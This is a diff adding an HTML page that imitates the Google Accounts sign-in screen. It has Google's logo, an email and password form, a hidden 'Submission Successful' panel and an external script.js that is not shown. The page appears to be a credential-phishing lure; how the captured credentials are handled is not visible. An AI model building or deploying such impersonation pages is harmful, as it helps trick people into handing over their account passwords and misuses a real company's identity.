@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <div id="login-step">
+            <div class="logo">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo">
+            </div>
+            <h1>Sign in</h1>
+            <p>Use your Google Account</p>
+            <form id="login-form">
+                <input type="email" id="email" placeholder="Email or phone" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <div id="error-message" style="color: red; display: none; margin-top: 10px; text-align: left;"></div>
+                <a href="#" class="forgot-link">Forgot email?</a>
+                <div class="button-container">
+                    <a href="#" class="create-account-link">Create account</a>
+                    <button type="submit" class="next-button">Next</button>
+                </div>
+            </form>
+        </div>
+
+        
+
+        <div class="congrats-container" style="display: none;">
+            <h2>Congratulations!</h2>
+            <p>Submission Successful</p>
+        </div>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
